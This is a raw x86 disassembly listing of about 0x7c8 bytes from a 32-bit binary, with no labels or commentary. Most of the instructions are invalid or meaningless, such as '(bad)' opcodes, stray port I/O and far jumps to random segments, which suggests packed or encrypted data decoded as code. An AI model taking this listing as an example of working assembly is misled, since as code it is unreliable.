  40d3bf:	adc    BYTE PTR [edi+0x1b135d6e],0x95
  40d3c6:	cmp    DWORD PTR fs:[esi],edx
  40d3c9:	mov    ecx,0xecc479b3
  40d3ce:	mov    cs,WORD PTR [esi-0x21]
  40d3d1:	and    BYTE PTR [ecx-0x649fd2d1],ah
  40d3d7:	test   al,0x1b
  40d3d9:	fsubr  DWORD PTR [edx]
  40d3db:	cmp    eax,0x6506731a
  40d3e0:	xchg   DWORD PTR [ecx+ebx*8-0x73],ebx
  40d3e4:	mov    edx,0xbd8b0418
  40d3e9:	xor    BYTE PTR ds:0xc1f45ec9,al
  40d3ef:	xlat   BYTE PTR ds:[ebx]
  40d3f0:	xlat   BYTE PTR ds:[ebx]
  40d3f1:	retf   
  40d3f2:	icebp  
  40d3f3:	jne    0x40d452
  40d3f5:	in     al,dx
  40d3f6:	push   ss
  40d3f7:	in     eax,dx
  40d3f8:	xchg   ebp,eax
  40d3f9:	idiv   eax
  40d3fb:	ins    DWORD PTR es:[edi],dx
  40d3fc:	mov    edi,edi
  40d3fe:	sub    BYTE PTR [edx+edi*4-0x6ae6a9ee],bh
  40d405:	mov    gs,WORD PTR [ebx]
  40d407:	mov    WORD PTR [esp+esi*8-0x6e],es
  40d40b:	pop    edi
  40d40c:	push   ecx
  40d40d:	lds    esi,FWORD PTR [eax+0x4b]
  40d410:	xchg   esi,eax
  40d411:	xchg   edx,eax
  40d412:	gs int3 
  40d414:	push   0x45f78207
  40d419:	out    dx,al
  40d41a:	rol    al,0xf5
  40d41d:	imul   edi,DWORD PTR [edi+eax*4-0x1e],0xffffffcd
  40d422:	mov    ds:0x2631f675,eax
  40d427:	imul   esp,DWORD PTR [ebx+edx*8],0x8499206
  40d42e:	pusha  
  40d42f:	jge    0x40d3ea
  40d431:	push   cs
  40d432:	je     0x40d3de
  40d434:	hlt    
  40d435:	outs   dx,BYTE PTR ds:[esi]
  40d436:	dec    esi
  40d437:	pop    ds
  40d438:	lea    eax,[edx]
  40d43a:	test   DWORD PTR [ecx],ecx
  40d43c:	mov    ebx,0xb297b8bd
  40d441:	daa    
  40d442:	mov    ds:0xf6597720,al
  40d447:	loopne 0x40d434
  40d449:	icebp  
  40d44a:	pop    esp
  40d44b:	outs   dx,BYTE PTR ds:[esi]
  40d44c:	mov    ebp,0x5f4e5af3
  40d451:	pop    edx
  40d452:	iret   
  40d453:	inc    ebp
  40d454:	test   al,0xd2
  40d456:	jmp    0xf08b:0xf3b738fa
  40d45d:	dec    edx
  40d45e:	add    BYTE PTR [eax+0x78208a8c],0xe5
  40d465:	ss push eax
  40d467:	jb     0x40d426
  40d469:	jmp    0x458:0x2a932518
  40d470:	mov    dl,dl
  40d472:	sbb    al,0x8e
  40d474:	jae    0x40d4b8
  40d476:	mov    bh,0x61
  40d478:	pop    esi
  40d479:	or     edi,DWORD PTR [eax+0x7f7569b0]
  40d47f:	adc    ah,BYTE PTR [ecx]
  40d481:	addr16 push cs
  40d483:	sub    al,al
  40d485:	js     0x40d463
  40d487:	cmp    al,0x80
  40d489:	frstor [edx+0xb]
  40d48c:	(bad)  
  40d48d:	aad    0xf8
  40d48f:	sbb    DWORD PTR [ecx],eax
  40d491:	mov    eax,0xc77dcb7f
  40d496:	pop    esp
  40d497:	jmp    0x33777ff4
  40d49c:	sbb    eax,0xab07be6d
  40d4a1:	sbb    eax,0x13d3c07f
  40d4a6:	jecxz  0x40d4bb
  40d4a8:	out    0x96,al
  40d4aa:	add    ch,BYTE PTR [ecx+0x8]
  40d4ad:	push   ebp
  40d4ae:	mov    WORD PTR ds:0xcf7b7a42,fs
  40d4b4:	popf   
  40d4b5:	jle    0x40d460
  40d4b7:	xor    BYTE PTR [ebx-0x419e1f24],dh
  40d4bd:	xlat   BYTE PTR ds:[ebx]
  40d4be:	adc    bh,BYTE PTR [esp+ebp*1-0x62ebcbed]
  40d4c5:	cmc    
  40d4c6:	outs   dx,DWORD PTR ds:[esi]
  40d4c7:	adc    DWORD PTR [ecx+ebp*4],ecx
  40d4ca:	jmp    0x623a401f
  40d4cf:	in     eax,0xc
  40d4d1:	inc    edi
  40d4d2:	cmp    ebp,DWORD PTR [edi-0x3e]
  40d4d5:	add    BYTE PTR [edx+edi*2+0x15],al
  40d4d9:	shr    BYTE PTR [ebp+0x35],0x13
  40d4dd:	ss inc esi
  40d4df:	(bad)  
  40d4e0:	push   0x4c
  40d4e2:	pop    esi
  40d4e3:	adc    ah,BYTE PTR [eax+0xa136fd7]
  40d4e9:	mov    ds:0xbdc9af9e,eax
  40d4ee:	dec    edx
  40d4ef:	mov    eax,ds:0x4e930e0a
  40d4f4:	icebp  
  40d4f5:	out    0x74,eax
  40d4f7:	sbb    eax,0xbcaad9c4
  40d4fc:	and    eax,0x262ef259
  40d501:	or     eax,DWORD PTR [ecx-0x27]
  40d504:	fcmove st,st(5)
  40d506:	mov    al,0xb6
  40d508:	pushf  
  40d509:	mov    ds:0x3ddefec,eax
  40d50e:	xor    al,0x69
  40d510:	dec    ebp
  40d511:	inc    ecx
  40d512:	ja     0x40d587
  40d514:	lahf   
  40d515:	dec    edx
  40d516:	loopne 0x40d4b0
  40d518:	retf   
  40d519:	arpl   WORD PTR [ebx],cx
  40d51b:	lea    ecx,[edi-0x5387d8c3]
  40d521:	jnp    0x40d58c
  40d523:	(bad)  
  40d524:	mov    edx,0x4453ce25
  40d529:	fdiv   QWORD PTR [ebx+0x1b5f164b]
  40d52f:	mov    ds:0xbd3557da,eax
  40d534:	cwde   
  40d535:	pop    esp
  40d536:	aad    0xbb
  40d538:	sar    BYTE PTR [ecx-0x1c],1
  40d53b:	retf   0x1816
  40d53e:	or     al,0x38
  40d540:	jl     0x871191b1
  40d546:	lds    esp,FWORD PTR [esi+0x368e4ac]
  40d54c:	ins    BYTE PTR es:[edi],dx
  40d54d:	mov    cl,dh
  40d54f:	sbb    al,BYTE PTR ds:0x2b327ddc
  40d555:	pop    eax
  40d556:	dec    ebx
  40d557:	(bad)  
  40d558:	cmc    
  40d559:	mov    ecx,0xbc766fab
  40d55e:	div    BYTE PTR [ebx+0x4f52d21b]
  40d564:	dec    esi
  40d565:	mov    eax,0xfc683906
  40d56a:	and    BYTE PTR [edi+0x37],dl
  40d56d:	std    
  40d56e:	ds loop 0x40d5eb
  40d571:	dec    ecx
  40d572:	mov    bl,ch
  40d574:	jg     0x40d520
  40d576:	or     eax,0x3fe99605
  40d57b:	xchg   ebx,eax
  40d57c:	mov    ds:0x376e5676,eax
  40d581:	xchg   edx,eax
  40d582:	sbb    DWORD PTR [esi-0x79b88a0b],ecx
  40d588:	cmp    BYTE PTR [edi+ebp*1+0x2c],cl
  40d58c:	sbb    al,0x94
  40d58e:	jb     0x40d54a
  40d590:	cmp    eax,0x93b82ebe
  40d595:	push   ebx
  40d596:	mov    bh,0x37
  40d598:	push   ebp
  40d599:	push   edi
  40d59a:	gs or  edi,edx
  40d59d:	int    0x46
  40d59f:	mov    esp,0x3e8bead6
  40d5a4:	or     BYTE PTR cs:[edx-0x34971d8e],ch
  40d5ab:	sbb    ebp,ebx
  40d5ad:	mov    cl,0xde
  40d5af:	mov    cl,0xb9
  40d5b1:	cdq    
  40d5b2:	inc    eax
  40d5b3:	mov    ebp,0x75da73c0
  40d5b8:	test   BYTE PTR [edi+edx*1-0x39672425],dl
  40d5bf:	pop    ebp
  40d5c0:	sbb    bl,BYTE PTR [ebx]
  40d5c2:	fild   DWORD PTR [ebx-0x2b]
  40d5c5:	adc    DWORD PTR [edx],ebx
  40d5c7:	cdq    
  40d5c8:	(bad)
  40d5cb:	outs   dx,BYTE PTR ds:[esi]
  40d5cc:	lods   eax,DWORD PTR ds:[esi]
  40d5cd:	adc    eax,0x708e52a1
  40d5d2:	adc    DWORD PTR [edx+0x70],0x4d
  40d5d6:	mov    ds:0x8d71f180,al
  40d5db:	mov    edi,0xfece53e
  40d5e0:	scas   eax,DWORD PTR es:[edi]
  40d5e1:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d5b7
  40d62d:	or     al,0xdf
  40d62f:	xor    al,0x2b
  40d631:	nop
  40d632:	jle    0x40d6b2
  40d634:	jge    0x40d6b3
  40d636:	jle    0x40d6b6
  40d638:	test   DWORD PTR [ecx+0x49d03e24],ecx
  40d63e:	mov    ecx,0x7c7f5880
  40d643:	jb     0x546f76a0
  40d649:	sbb    dl,BYTE PTR [edi-0x1313d148]
  40d64f:	dec    ebx
  40d650:	jle    0x40d669
  40d652:	stos   BYTE PTR es:[edi],al
  40d653:	dec    edi
  40d654:	mov    al,BYTE PTR [esi-0x33]
  40d657:	sub    DWORD PTR [esi],ebp
  40d659:	sti    
  40d65a:	add    ecx,eax
  40d65c:	push   ecx
  40d65d:	call   0xb371:0x4acd9b18
  40d664:	xlat   BYTE PTR ds:[ebx]
  40d665:	mov    dl,0x51
  40d667:	pop    ebp
  40d668:	inc    ebp
  40d669:	cmp    eax,0xf046f9ad
  40d66e:	shr    ecx,cl
  40d670:	stos   BYTE PTR es:[edi],al
  40d671:	out    0x11,eax
  40d673:	inc    ebx
  40d674:	lds    edi,FWORD PTR [edx]
  40d676:	cmp    al,BYTE PTR [edi]
  40d678:	sbb    cl,al
  40d67a:	mov    eax,ds:0x60752077
  40d67f:	sbb    eax,0x88b4618f
  40d684:	lea    ebx,[ebx-0x7ea9fd99]
  40d68a:	sbb    BYTE PTR [edi-0x35],cl
  40d68d:	shl    DWORD PTR [edi+0x3c7234f7],1
  40d693:	in     eax,0x23
  40d695:	sbb    DWORD PTR [ecx-0x1907a04c],esp
  40d69b:	call   0x32cc:0xdd593266
  40d6a2:	xchg   esp,eax
  40d6a3:	cmpps  xmm5,XMMWORD PTR [edx],0x5c
  40d6a7:	mov    ah,0x8a
  40d6a9:	inc    esp
  40d6aa:	lods   al,BYTE PTR ds:[esi]
  40d6ab:	fisttp DWORD PTR cs:[ebx+0xbca2e68]
  40d6b2:	test   DWORD PTR [ebp+0x4328a94],eax
  40d6b8:	sahf   
  40d6b9:	lods   al,BYTE PTR ds:[esi]
  40d6ba:	xchg   edx,eax
  40d6bb:	add    eax,0xe80f4da4
  40d6c0:	adc    BYTE PTR [edi],dl
  40d6c2:	bound  eax,QWORD PTR [esp+ecx*8]
  40d6c5:	cmp    BYTE PTR [esi+0x7f58df9b],ah
  40d6cb:	pusha  
  40d6cc:	data16 xor bl,BYTE PTR [edi+0x2e]
  40d6d0:	push   0xc56af5fe
  40d6d5:	push   ss
  40d6d6:	cmp    eax,0xf9c118fa
  40d6db:	jo     0x40d6f1
  40d6dd:	lahf   
  40d6de:	scas   eax,DWORD PTR es:[edi]
  40d6df:	dec    eax
  40d6e0:	jnp    0x40d733
  40d6e2:	inc    BYTE PTR ds:0x1d0f20ff
  40d6e8:	dec    esp
  40d6e9:	adc    al,0xa2
  40d6eb:	mov    al,BYTE PTR [ecx]
  40d6ed:	(bad)  
  40d6ef:	loopne 0x40d693
  40d6f1:	dec    ebx
  40d6f2:	pusha  
  40d6f3:	sti    
  40d6f4:	sbb    eax,DWORD PTR [ecx+0x2d]
  40d6f7:	mov    dl,0x6f
  40d6f9:	or     ch,al
  40d6fb:	scas   eax,DWORD PTR es:[edi]
  40d6fc:	jl     0x40d719
  40d6fe:	mov    ?,WORD PTR [edi]
  40d700:	(bad)  
  40d701:	pushf  
  40d702:	mov    ah,0xed
  40d704:	aam    0x2f
  40d706:	xor    al,0x98
  40d708:	adc    edx,DWORD PTR [eax+edx*1-0x6a0e0c7c]
  40d70f:	add    eax,0xceef657c
  40d714:	leave  
  40d715:	pushf  
  40d716:	jne    0x40d6d0
  40d718:	add    BYTE PTR [ebx+0x43da6e99],bh
  40d71e:	fisubr WORD PTR [eax+0x344e19c5]
  40d724:	dec    ecx
  40d725:	or     al,0x73
  40d727:	inc    esi
  40d728:	in     al,0xfc
  40d72a:	lods   al,BYTE PTR ds:[esi]
  40d72b:	retf   
  40d72c:	inc    esi
  40d72d:	aad    0x7f
  40d72f:	mov    ebx,0xec1ecece
  40d734:	fsubr  DWORD PTR ds:0x30d4df5e
  40d73a:	add    bh,0xdf
  40d73d:	je     0x40d784
  40d73f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d740:	inc    edx
  40d741:	mov    esi,0x553425e8
  40d746:	fisttp QWORD PTR [ebx]
  40d748:	sbb    BYTE PTR [ebx],bl
  40d74a:	cmp    al,ah
  40d74c:	sub    DWORD PTR [ebx+0x1338a7e2],ebx
  40d752:	add    al,0xaa
  40d754:	fisub  DWORD PTR [edi+eiz*8+0x53]
  40d758:	fidiv  WORD PTR [ebp+eax*8-0x53bc229b]
  40d75f:	sbb    esi,DWORD PTR [edi-0x3d]
  40d762:	sub    ebp,esp
  40d764:	push   edi
  40d765:	jmp    0x8a232348
  40d76a:	xor    al,0x8c
  40d76c:	loopne 0x40d785
  40d76e:	loopne 0x40d6f1
  40d770:	scas   al,BYTE PTR es:[edi]
  40d771:	pop    ds
  40d772:	test   BYTE PTR [esp+esi*1-0x5b5939af],0xb
  40d77a:	mov    esi,0x34f3f6ab
  40d77f:	leave  
  40d780:	push   esp
  40d781:	pushf  
  40d782:	cmc    
  40d783:	pop    eax
  40d784:	jns    0x40d7dd
  40d786:	cld    
  40d787:	repnz add DWORD PTR [esi*2+0x7c9f3c27],edi
  40d78f:	lods   eax,DWORD PTR ds:[esi]
  40d790:	fsubrp st(5),st
  40d792:	rcl    BYTE PTR gs:[esi+0x7a],1
  40d796:	call   0x40ab:0x26804e6
  40d79d:	pop    ds
  40d79e:	inc    ebp
  40d79f:	aam    0x6
  40d7a1:	or     bh,bh
  40d7a3:	push   edx
  40d7a4:	xchg   esp,eax
  40d7a5:	and    al,0xad
  40d7a7:	stos   DWORD PTR es:[edi],eax
  40d7a8:	xchg   ebx,eax
  40d7a9:	out    dx,al
  40d7aa:	rol    DWORD PTR [ebx-0x56],1
  40d7ad:	push   ss
  40d7ae:	aas    
  40d7af:	xor    eax,0xd16bb8ad
  40d7b4:	or     DWORD PTR [edx-0x1dfcc798],ebx
  40d7ba:	ret    
  40d7bb:	or     BYTE PTR [eax-0x40],0xc8
  40d7bf:	adc    eax,0x651db049
  40d7c4:	pop    ds
  40d7c5:	mov    ds,esp
  40d7c7:	add    DWORD PTR [ebx+0x3e],edi
  40d7ca:	fnstenv [ebx-0x56258b65]
  40d7d0:	jp     0x40d7dc
  40d7d2:	pop    ds
  40d7d3:	push   esp
  40d7d4:	push   ss
  40d7d5:	mov    eax,0x6c39e3dc
  40d7da:	xchg   esi,eax
  40d7db:	dec    esi
  40d7dc:	sub    ch,al
  40d7de:	pop    ebx
  40d7df:	mov    ecx,0x699e3ff1
  40d7e4:	pop    eax
  40d7e5:	cwde   
  40d7e6:	sub    bh,dl
  40d7e8:	sub    DWORD PTR [edi],esp
  40d7ea:	ds jns 0x40d847
  40d7ed:	cmp    esp,edx
  40d7ef:	jecxz  0x40d81d
  40d7f1:	mov    eax,ds:0x7b6fed74
  40d7f6:	jbe    0x40d7c0
  40d7f8:	mov    esp,0x7b62a43e
  40d7fd:	jg     0x40d78e
  40d7ff:	sbb    al,0x8c
  40d801:	enter  0xc39c,0x90
  40d805:	out    dx,eax
  40d806:	cmp    eax,0xb2e8beae
  40d80b:	pop    eax
  40d80c:	lea    eax,[ecx+edi*1-0x6b]
  40d810:	jp     0x8ec173d5
  40d816:	mov    edx,DWORD PTR [esi]
  40d818:	push   edi
  40d819:	pop    ds
  40d81a:	sub    DWORD PTR [ebx],edi
  40d81c:	ja     0x40d836
  40d81e:	mov    ecx,0xa5780616
  40d823:	repnz add DWORD PTR ds:0x207b93f,ebx
  40d82a:	daa    
  40d82b:	inc    edx
  40d82c:	xchg   edi,eax
  40d82d:	call   0x1a170f21
  40d832:	or     DWORD PTR [edx],edx
  40d834:	arpl   WORD PTR [esi+0x12],di
  40d837:	test   BYTE PTR [ecx],0x82
  40d83a:	push   eax
  40d83b:	jge    0x40d82f
  40d83d:	loopne 0x40d7e3
  40d83f:	and    BYTE PTR [ecx],cl
  40d841:	test   DWORD PTR [edx-0x2d],ebx
  40d844:	push   0xc7a7d3f1
  40d849:	adc    DWORD PTR [ebx+0x226637ca],edx
  40d84f:	je     0x40d86a
  40d851:	mov    dl,dh
  40d853:	in     al,0x10
  40d855:	out    dx,eax
  40d856:	sub    eax,0x1e883976
  40d85b:	pushf  
  40d85c:	sub    al,bh
  40d85e:	add    al,0x3d
  40d860:	push   esi
  40d861:	jbe    0x40d807
  40d863:	ret    
  40d864:	ret    0xab70
  40d867:	jle    0x40d7f2
  40d869:	cmp    DWORD PTR [ebx-0x69c25247],ecx
  40d86f:	aas    
  40d870:	lods   al,BYTE PTR ds:[esi]
  40d871:	jle    0x40d82d
  40d873:	push   es
  40d874:	cdq    
  40d875:	arpl   WORD PTR [ebx],cx
  40d877:	bound  eax,QWORD PTR [eax+0x46]
  40d87a:	pop    ebx
  40d87b:	test   DWORD PTR [eax+0x16600d62],eax
  40d881:	lock call 0xe0e:0x3b7275c9
  40d889:	ins    DWORD PTR es:[edi],dx
  40d88a:	jnp    0x40d870
  40d88c:	pop    ebp
  40d88d:	sti    
  40d88e:	mov    ds:0xcfe0c403,eax
  40d893:	adc    DWORD PTR [ecx],ebx
  40d895:	sbb    al,BYTE PTR [esi]
  40d897:	sub    edx,0x16
  40d89a:	ror    ebx,0x7b
  40d89d:	adc    DWORD PTR [edi],edi
  40d89f:	aas    
  40d8a0:	mov    esp,0x53611d2
  40d8a5:	pop    esp
  40d8a6:	dec    esi
  40d8a7:	mov    al,ds:0xb786d190
  40d8ac:	xchg   ebp,eax
  40d8ad:	add    BYTE PTR [eax-0x2e3bf2fb],ch
  40d8b3:	xlat   BYTE PTR gs:[ebx]
  40d8b5:	add    eax,0x3ccbe891
  40d8ba:	and    BYTE PTR [ebx+0x26],al
  40d8bd:	ja     0x40d8c5
  40d8bf:	ins    DWORD PTR es:[edi],dx
  40d8c0:	xor    al,0xb
  40d8c2:	adc    ah,BYTE PTR [eax+0x1a86e062]
  40d8c8:	mov    WORD PTR [eax-0x2],?
  40d8cb:	lods   eax,DWORD PTR ds:[esi]
  40d8cc:	iret   
  40d8cd:	xchg   edx,eax
  40d8ce:	mov    DWORD PTR [edi+ebp*4+0x54e11ae1],ebp
  40d8d5:	jbe    0x40d90f
  40d8d7:	(bad)  
  40d8d8:	fidiv  DWORD PTR [ebp-0x30]
  40d8db:	out    0xb4,al
  40d8dd:	es loope 0x40d89e
  40d8e0:	fnsave [ebp-0x35]
  40d8e3:	jns    0x40d911
  40d8e5:	fadd   DWORD PTR [ebx+0x3caa88f]
  40d8eb:	arpl   WORD PTR [ecx],dx
  40d8ed:	call   0x27a1f91b
  40d8f2:	xchg   esp,eax
  40d8f3:	adc    ebp,DWORD PTR [ecx-0x4c70a71c]
  40d8f9:	scas   al,BYTE PTR es:[edi]
  40d8fa:	mov    ah,0xdc
  40d8fc:	mov    ebx,0xdf4e1538
  40d901:	cmp    eax,0xaf5b2a11
  40d906:	adc    al,BYTE PTR ds:0x756ff801
  40d90c:	fdiv   QWORD PTR [eax+0x676783c4]
  40d912:	push   es
  40d913:	add    ah,BYTE PTR [ebp+0x1ff6b3a5]
  40d919:	sub    bl,BYTE PTR es:[ebx-0xb]
  40d91d:	es fs fs push cs
  40d921:	ds push es
  40d923:	jmp    FWORD PTR [eax]
  40d925:	addr16 (bad) 
  40d927:	lods   al,BYTE PTR ds:[esi]
  40d928:	lock jp 0x40d992
  40d92b:	fidivr WORD PTR [ebp-0x36]
  40d92e:	push   ss
  40d92f:	jecxz  0x40d9a3
  40d931:	inc    edi
  40d932:	add    cl,BYTE PTR [esi-0x1282b9bb]
  40d938:	mov    edi,0xd133574c
  40d93d:	lea    eax,[edx+eax*1+0x32729b]
  40d944:	jmp    0x40dc64
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	lock test DWORD PTR [edx],0x7e9f36af
  40d95c:	jle    0x40d9db
  40d95e:	jge    0x40d9de
  40d960:	jle    0x40d956
  40d962:	leave  
  40d963:	ja     0x40d972
  40d965:	pop    eax
  40d966:	cwde   
  40d967:	test   DWORD PTR [eax-0x32],edi
  40d96a:	js     0x40d9c1
  40d96c:	mov    bh,BYTE PTR [ecx]
  40d96e:	mov    al,bh
  40d970:	sub    al,0x24
  40d972:	ins    BYTE PTR es:[edi],dx
  40d973:	push   ebx
  40d974:	(bad)  
  40d975:	cld    
  40d976:	shl    BYTE PTR [edx+0x4ab19822],cl
  40d97c:	sbb    al,0x77
  40d97e:	loopne 0x40d952
  40d980:	fdiv   st,st(4)
  40d982:	inc    edx
  40d983:	xor    DWORD PTR [ebp+0x7f88f97c],0xfffffff9
  40d98a:	mov    ecx,0x88d2b8dc
  40d98f:	fcom   QWORD PTR [ebp+0x77c93351]
  40d995:	lea    ecx,[ecx+0x58]
  40d998:	aam    0xf4
  40d99a:	mov    esp,0xdd2d6add
  40d99f:	rcl    DWORD PTR [eax],1
  40d9a1:	adc    cl,BYTE PTR [ebp-0x44f84629]
  40d9a7:	int3   
  40d9a8:	rcl    bl,1
  40d9aa:	sub    eax,0xb0d43582
  40d9af:	cli    
  40d9b0:	es sbb dl,ch
  40d9b3:	neg    DWORD PTR [edx+0x1e]
  40d9b6:	cwde   
  40d9b7:	jb     0x40da33
  40d9b9:	mov    eax,ds:0x514c409e
  40d9be:	sub    al,0x3d
  40d9c0:	mov    dh,0x1
  40d9c2:	std    
  40d9c3:	push   ds
  40d9c4:	cld    
  40d9c5:	push   esp
  40d9c6:	mov    eax,ds:0xa4327a5e
  40d9cb:	popa   
  40d9cc:	outs   dx,DWORD PTR ds:[esi]
  40d9cd:	pop    ds
  40d9ce:	jg     0x40d9a8
  40d9d0:	pop    DWORD PTR [ebp+0x49af71b7]
  40d9d6:	(bad)  [ecx-0x3fae2ee]
  40d9dc:	aam    0x62
  40d9de:	ins    BYTE PTR es:[edi],dx
  40d9df:	jg     0x40d9d0
  40d9e1:	dec    ebp
  40d9e2:	add    al,0x96
  40d9e4:	scas   al,BYTE PTR es:[edi]
  40d9e5:	in     al,dx
  40d9e6:	popf   
  40d9e7:	mov    ebx,0x989535ed
  40d9ec:	mov    cl,BYTE PTR [ecx+0x12107932]
  40d9f2:	pop    eax
  40d9f3:	lock call 0xa437:0x5f37a808
  40d9fb:	cwde   
  40d9fc:	jg     0x40da4f
  40d9fe:	ds pusha 
  40da00:	sbb    eax,0x55ba65eb
  40da05:	cmp    DWORD PTR [edi+0x8],0xe57ad725
  40da0c:	popf   
  40da0d:	push   0x22
  40da0f:	and    eax,0xc1572786
  40da14:	ret    
  40da15:	sbb    BYTE PTR [esi],ah
  40da17:	shl    BYTE PTR [edi+0x3a],cl
  40da1a:	push   DWORD PTR [ecx+0x7b]
  40da1d:	mov    ecx,0xf608409
  40da22:	dec    edx
  40da23:	fwait
  40da24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da25:	pusha  
  40da26:	ins    DWORD PTR es:[edi],dx
  40da27:	loopne 0x40da0f
  40da29:	add    cl,dl
  40da2b:	mov    bp,0x3eff
  40da2f:	iret   
  40da30:	retf   
  40da31:	or     eax,0x63e03595
  40da36:	outs   dx,DWORD PTR ss:[esi]
  40da38:	jge    0x40d9fb
  40da3a:	mov    esp,0x679f0085
  40da3f:	jbe    0x40d9f4
  40da41:	sbb    dl,BYTE PTR [edi]
  40da43:	push   0xfffffffd
  40da45:	mov    ebp,0xe2a6b465
  40da4a:	daa    
  40da4b:	pcmpeqw mm5,QWORD PTR [ebp+0x78538b51]
  40da52:	inc    edi
  40da53:	add    BYTE PTR [ebp+ecx*4+0x26],cl
  40da57:	jmp    0x261e520f
  40da5c:	mov    ebx,0xf7054b3d
  40da61:	mov    edx,DWORD PTR [ebp+0x1b]
  40da64:	(bad)  
  40da65:	js     0x40daa3
  40da67:	ja     0x40da31
  40da69:	mov    DWORD PTR [edi],0xbd3ae5a7
  40da6f:	retf   
  40da70:	in     eax,dx
  40da71:	outs   dx,BYTE PTR ds:[esi]
  40da72:	(bad)  
  40da73:	ins    BYTE PTR es:[edi],dx
  40da74:	inc    esp
  40da75:	push   eax
  40da76:	xchg   ecx,eax
  40da77:	sti    
  40da78:	pop    esp
  40da79:	inc    ebp
  40da7a:	jle    0x40da43
  40da7c:	(bad)  
  40da7d:	or     al,BYTE PTR [edi+0x2e]
  40da80:	retf   
  40da81:	daa    
  40da82:	inc    esp
  40da83:	mov    fs,WORD PTR [edx]
  40da85:	ss mov bl,0xf6
  40da88:	dec    ecx
  40da89:	cmp    ah,BYTE PTR [ecx+0x29a0435d]
  40da8f:	sbb    eax,0xb21e278b
  40da94:	cmp    DWORD PTR [eax+0x70],0x2dd5175b
  40da9b:	(bad)  
  40da9d:	push   es
  40da9e:	sub    eax,0x8ad3c47a
  40daa3:	daa    
  40daa4:	add    al,0xb2
  40daa6:	addr16 push 0x2eef8638
  40daac:	(bad)  
  40daad:	out    0x5c,al
  40daaf:	lock ret 0xd32c
  40dab3:	add    ch,al
  40dab5:	or     eax,0x5376d7cc
  40daba:	(bad)  
  40dabc:	inc    ebp
  40dabd:	lea    eax,[ebx-0x12]
  40dac0:	inc    edi
  40dac1:	imul   eax,DWORD PTR [ebp+0x36],0x5e7a2d7d
  40dac8:	fidivr WORD PTR [edi-0x4af4d8b2]
  40dace:	repnz mov al,0xb
  40dad1:	gs push 0xffffff87
  40dad4:	push   ebx
  40dad5:	push   ecx
  40dad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dad7:	loopne 0x40dad3
  40dad9:	jno    0x40da95
  40dadb:	push   ss
  40dadc:	xlat   BYTE PTR ds:[ebx]
  40dadd:	add    esp,0x5c
  40dae0:	sbb    ch,bh
  40dae2:	dec    edi
  40dae3:	daa    
  40dae4:	cld    
  40dae5:	in     eax,0x4e
  40dae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dae8:	xor    esi,DWORD PTR [ebp+0x11498562]
  40daee:	pop    es
  40daef:	(bad)  
  40daf1:	dec    esi
  40daf2:	push   ebx
  40daf3:	cmp    esp,DWORD PTR [edx+0xa0ff6d6]
  40daf9:	pop    edi
  40dafa:	scas   al,BYTE PTR es:[edi]
  40dafb:	pusha  
  40dafc:	aaa    
  40dafd:	(bad)  
  40dafe:	and    eax,0xc577035c
  40db03:	or     edi,edx
  40db05:	retf   0xa27e
  40db08:	push   eax
  40db09:	xchg   esi,eax
  40db0a:	inc    ecx
  40db0b:	(bad)  
  40db0c:	nop
  40db0d:	(bad)  
  40db0e:	adc    al,0x28
  40db10:	hlt    
  40db11:	jo     0x40dafb
  40db13:	(bad)  
  40db15:	lods   al,BYTE PTR ds:[esi]
  40db16:	(bad)  
  40db17:	(bad)
  40db1b:	aas    
  40db1c:	mov    dl,0x58
  40db1e:	lahf   
  40db1f:	adc    ebp,edi
  40db21:	jno    0x40db68
  40db23:	or     ch,al
  40db25:	(bad)  
  40db26:	dec    ebx
  40db27:	fucomi st,st(1)
  40db29:	ret    
  40db2a:	cli    
  40db2b:	jmp    0x40db34
  40db2d:	adc    ecx,DWORD PTR [ebp+esi*4+0x4]
  40db31:	loopne 0x40db75
  40db33:	mov    ah,0x7
  40db35:	ins    DWORD PTR es:[edi],dx
  40db36:	mov    cl,BYTE PTR [ecx+0x46]
  40db39:	ret    
  40db3a:	fst    QWORD PTR ds:0x7dfade5a
  40db40:	popf   
  40db41:	shl    DWORD PTR ds:0xa073e725,cl
  40db47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db48:	retf   0xe19d
  40db4b:	jb     0x40dad0
  40db4d:	out    dx,eax
  40db4e:	add    eax,0x719f0666
  40db53:	pop    ecx
  40db54:	std    
  40db55:	xor    ch,cl
  40db57:	clc    
  40db58:	add    DWORD PTR [edi],edi
  40db5a:	xor    cl,BYTE PTR [ebx]
  40db5c:	cdq    
  40db5d:	adc    al,0xe4
  40db5f:	cmp    ecx,DWORD PTR [edx]
  40db61:	sub    dl,BYTE PTR [ecx]
  40db63:	rol    BYTE PTR [esi+0x32],cl
  40db66:	je     0x40dae9
  40db68:	les    ecx,FWORD PTR [edi-0x6a757fb8]
  40db6e:	cmc    
  40db6f:	pop    ds
  40db70:	xor    al,0x82
  40db72:	jns    0x40db78
  40db74:	leave  
  40db75:	cwde   
  40db76:	imul   ebx,DWORD PTR [edi-0x4c],0x16
  40db7a:	cmp    eax,DWORD PTR [esi+esi*4]
  40db7d:	inc    ebp
  40db7e:	rol    dl,cl
  40db80:	test   eax,0xfbbbb355
  40db85:	icebp  
  40db86:	push   esi
  40db87:	pop    eax
